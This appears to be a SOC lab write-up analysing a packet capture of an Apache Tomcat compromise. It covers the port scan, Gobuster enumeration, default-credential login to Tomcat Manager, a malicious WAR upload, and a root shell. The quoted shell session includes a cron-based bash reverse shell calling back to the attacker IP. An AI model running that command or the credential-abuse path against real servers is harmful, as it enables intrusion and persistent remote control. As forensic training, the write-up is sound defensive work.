Executive Summary

In this lab, I analyzed a packet capture from an internal environment where the SOC team suspected malicious activity against an Apache Tomcat web server. The investigation started with normal PCAP triage: checking the capture timeframe, protocol distribution and active hosts before drilling into individual HTTP streams.

The packet-level evidence shows that 14.0.0.120 performed reconnaissance against 10.0.0.112, discovered exposed services on ports 22, 8080 and 8009, enumerated Tomcat management paths with Gobuster, tried common Tomcat credentials, and eventually authenticated to Tomcat Manager with admin:tomcat.

After logging in, the attacker uploaded a malicious WAR file named JXQOZY.war through /manager/html/upload. The deployed application was then accessed at /JXQOZY/. A later TCP stream exposed interactive shell commands running as root, followed by a cron-based reverse shell persistence mechanism pointing back to 14.0.0.120:443.

Impact: The Tomcat server was compromised through valid credential abuse, malicious WAR deployment, command execution as root, and cron persistence for C2 callbacks.

Protocol and host overview

The protocol hierarchy showed a mostly TCP-based capture with HTTP and SSH traffic. Since the lab title and scenario point to Tomcat, HTTP traffic on Tomcat-related ports became the main focus.

2. SMB Background Traffic

Before focusing on Tomcat, I reviewed the early SMB traffic. This helped map internal hosts and avoid treating every packet as malicious without context.

I then checked SMB object export to determine whether any transferred files were suspicious.

The exported files appeared to contain simple work report text and did not become the main attack path. In an investigation report, I would classify this branch as reviewed but low priority compared with the Tomcat HTTP traffic.

3. Identifying the Tomcat Server

I observed an SSH handshake where 10.0.0.115 connected to 10.0.0.112:22, showing that 10.0.0.112 exposed SSH.

The more important evidence came from HTTP traffic to port 8080. A request to http://10.0.0.112:8080/ returned the default Apache Tomcat page.

4. Reconnaissance and Open Port Discovery

I investigated 14.0.0.120 because it appeared as an unusual non-private IP in the capture. Filtering on this IP revealed repeated TCP SYN packets to many destination ports on 10.0.0.112, which is consistent with TCP SYN scanning.

ip.src == 14.0.0.120 && tcp.flags.syn == 1 && tcp.flags.ack == 0

To identify open ports, I filtered for SYN/ACK responses from the target back to the scanner.

ip.src == 10.0.0.112 && ip.dst == 14.0.0.120 && tcp.flags == 0x0012

5. Tomcat Manager Enumeration and Credential Access

After the scan, the attacker started interacting with Tomcat management endpoints. One stream showed access to /host-manager/html/* with User-Agent: gobuster/3.6, indicating automated directory enumeration.

I then reviewed Basic Authentication attempts against /manager/html. Multiple requests returned 401 Unauthorized, indicating that the attacker was trying common Tomcat credentials.

One failed Authorization header decoded to tomcat:s3cr3t, but the response was still 401 Unauthorized. This is a good reminder: decoding a credential does not prove success; the HTTP response code must also be checked.

The successful login used Authorization: Basic YWRtaW46dG9tY2F0, which decodes to admin:tomcat. The server returned HTTP/1.1 200 OK and a JSESSIONID scoped to /manager, confirming successful Tomcat Manager access.

6. Malicious WAR Upload and Deployment

Once authenticated, the attacker uploaded a WAR file through the Tomcat Manager upload endpoint. The HTTP POST request contained a multipart form field named deployWar and the filename JXQOZY.war.

ip.addr == 14.0.0.120 && http.request.method == "POST"

A WAR file is a Java web application archive. It uses ZIP-style structure internally, which explains the PK bytes visible in the stream. In a Tomcat takeover scenario, a WAR often contains a JSP web shell or payload that allows command execution after deployment.

After the upload, the attacker accessed the deployed application path /JXQOZY/ and the server returned 200 OK. This confirmed that the WAR was successfully deployed.

7. Reverse Shell, Root Context and Cron Persistence

Later in the capture, I noticed a TCP stream from the victim back to the attacker. Following the stream revealed interactive command execution. The attacker first ran whoami, and the server returned root.

The commands observed in the shell included:

whoami
root

cd /tmp
pwd
/tmp

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron
crontab -l

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
This is the strongest compromise evidence in the capture: the attacker had shell access as root and installed a cron job that attempted to run a reverse shell to 14.0.0.120:443 every minute.

8. Attacker IP Enrichment

I also checked the external IP 14.0.0.120 using IP enrichment. The lookup placed the IP in Guangdong, China and associated it with ChinaNet Guangdong Province Network.

I treated geolocation only as IOC enrichment, not attribution. The conclusion that 14.0.0.120 was the attacker/C2 host came from packet behavior: scan, enumeration, authentication, WAR upload and callback traffic.

Lessons Learned

This lab reinforced a practical SOC workflow: start broad, map hosts, identify services, then pivot into protocol-specific evidence. The most useful technique was correlating HTTP Basic Auth headers with response status codes. A decoded credential alone is not enough; 401 means the attempt failed, while 200 OK plus a valid session cookie confirms success.

I also learned to separate evidence from enrichment. IP geolocation was useful for context, but the attacker conclusion came from behavior inside the PCAP. The final compromise proof came from the shell stream showing whoami returning root and cron persistence pointing back to the attacker IP.

Defensive takeaways: never expose Tomcat Manager publicly, disable weak/default credentials, restrict Manager access by source IP, avoid running Tomcat as root, monitor WAR deployment activity, alert on suspicious Basic Auth bursts, and hunt for cron jobs that execute reverse shell patterns.
